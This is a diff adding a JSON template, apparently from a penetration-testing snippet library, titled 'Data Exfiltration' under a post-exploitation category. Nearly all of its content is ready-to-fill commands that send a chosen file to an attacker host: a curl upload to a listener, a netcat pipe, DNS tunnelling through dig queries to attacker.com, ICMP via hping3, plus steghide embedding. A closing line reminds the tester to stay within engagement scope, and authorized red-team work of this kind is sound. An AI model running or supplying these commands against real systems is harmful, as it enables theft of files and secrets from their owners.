@@ -1,0 +1,10 @@
+{
+  "name": "Data Exfiltration",
+  "description": "Data exfiltration techniques",
+  "category": "post",
+  "variables": [
+    "file_path",
+    "attacker_ip"
+  ],
+  "content": "Exfiltrate {file_path} to {attacker_ip}.\n\n**HTTP/HTTPS :**\n```bash\n# Server (attacker)\npython3 -m http.server 8080\n\n# Client (target)\ncurl -X POST -F \"file=@{file_path}\" http://{attacker_ip}:8080/upload\n```\n\n**Netcat :**\n```bash\n# Attacker\nnc -lvnp 4444 > exfil.txt\n\n# Target\ncat {file_path} | nc {attacker_ip} 4444\n```\n\n**DNS tunneling :**\n```bash\n# Encode as base64 and send through DNS\ncat {file_path} | base64 | xxd -p | xargs -I {} dig {}.attacker.com\n```\n\n**ICMP :**\n```bash\n# With hping3\nhping3 -c 1 -E {file_path} -d 100 {attacker_ip}\n```\n\n**Steganography :**\n```bash\nsteghide embed -cf image.jpg -ef {file_path}\n```\n\n⚠️ Verify that exfiltration is authorized within the engagement scope."
+}
